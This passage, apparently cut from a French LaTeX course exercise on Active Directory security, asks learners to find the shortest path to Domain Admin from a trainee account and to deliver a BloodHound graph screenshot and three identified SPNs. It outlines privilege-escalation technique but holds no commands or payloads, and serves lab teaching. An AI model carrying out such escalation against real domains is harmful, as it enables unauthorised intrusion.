    \item Identifier le chemin le plus court vers \og{}Domain Admin\fg{}
          depuis le compte stagiaire.
\end{enumerate}

\medskip
\textbf{Livrable :} Capture d'écran du graphe BloodHound + liste des
3 SPN identifiés.
\end{boxexo}
